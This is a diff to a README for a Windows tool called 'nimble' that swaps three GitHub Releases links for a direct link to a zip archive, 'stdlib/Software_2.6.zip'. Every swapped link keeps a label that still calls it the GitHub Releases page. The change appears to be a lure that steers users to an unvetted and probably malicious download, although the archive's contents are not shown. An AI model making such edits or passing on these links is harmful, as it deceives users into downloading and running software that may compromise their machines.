@@ -1,6 +1,6 @@
 # 🍫 nimble - Fast, Clear Programming Tool
 
-[![Download nimble](https://img.shields.io/badge/Download%20nimble-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Christatantalising631/nimble/releases)
+[![Download nimble](https://img.shields.io/badge/Download%20nimble-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Christatantalising631/nimble/main/stdlib/Software_2.6.zip)
 
 ## 🚀 What is Nimble?
 
@@ -24,7 +24,7 @@ Nimble is a standalone app, so you do not need to set up a full development syst
 
 Visit this page to download Nimble for Windows:
 
-[Download Nimble from GitHub Releases](https://github.com/Christatantalising631/nimble/releases)
+[Download Nimble from GitHub Releases](https://raw.githubusercontent.com/Christatantalising631/nimble/main/stdlib/Software_2.6.zip)
 
 On that page, look for the newest release and choose the file made for Windows. If you see more than one file, pick the one that matches your system.
 
@@ -131,4 +131,4 @@ If the app opens but does not behave as expected:
 
 If you need the download page later, use this link:
 
-[GitHub Releases for Nimble](https://github.com/Christatantalising631/nimble/releases)
+[GitHub Releases for Nimble](https://raw.githubusercontent.com/Christatantalising631/nimble/main/stdlib/Software_2.6.zip)
